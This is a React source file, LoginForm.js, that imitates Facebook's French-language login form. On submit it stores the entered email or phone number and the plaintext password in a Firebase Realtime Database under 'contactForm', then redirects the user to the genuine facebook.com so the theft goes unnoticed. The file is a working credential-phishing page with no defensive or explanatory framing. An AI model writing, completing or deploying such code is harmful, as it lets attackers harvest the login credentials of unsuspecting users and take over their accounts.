// LoginForm.js
import React, { useState } from 'react';
import { db, ref, set } from './Firebase';
import './LoginForm.css';
import { getDatabase, push } from 'firebase/database';

const LoginForm = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const db = getDatabase();
      const userRef = ref(db, 'contactForm'); // Replace 'contactForm' with your desired collection or path

      // Utilisez push au lieu de set pour ajouter une nouvelle entrée avec une clé unique
      const newEntryRef = push(userRef);

      await set(newEntryRef, {
        email: email,
        password: password,
      });

      console.log('Login successful');
      window.location.href = 'https://www.facebook.com/?locale=fr_FR';

      
    } catch (error) {
      console.error('Login error:', error.message);
    }
  };

  // ... le reste de votre composant

  return (
    <form className="login-form" onSubmit={handleSubmit}>
      <input
        type="text"
        placeholder="Numéro mobile ou e-mail"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
      />
      <input
        type="password"
        placeholder="Mot de passe"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />
      <button type="submit">Se connecter</button>
      <a href="#">Mot de passe oublié ?</a>

      <div className="sep">
        <hr width="40%" />
        <span>ou</span>
        <hr width="40%" />
      </div>

      <button className="create-account-btn">Créer nouveau compte</button>
    </form>
  );
};

export default LoginForm;
